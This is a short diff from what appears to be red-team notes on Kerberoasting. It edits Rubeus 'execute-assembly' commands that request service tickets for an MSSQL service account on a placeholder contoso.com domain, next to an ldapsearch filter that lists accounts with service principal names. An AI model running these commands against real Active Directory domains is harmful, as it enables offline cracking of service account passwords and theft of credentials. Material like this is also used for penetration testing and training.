@@ -35,7 +35,7 @@ ldapsearch "(&(objectClass=user)(servicePrincipalName=*)(!(userAccountControl:1.
 ```
 
 ```powershell
-execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /spn:MSSQLSvc/dub-sql-2.dublin.contoso.com:1433 /simple /nowrap
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /spn:MSSQLSvc/dub-sql-2.dublin.contoso.com /simple /nowrap
 
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:MSSQLSVC /simple /nowrap
 ```
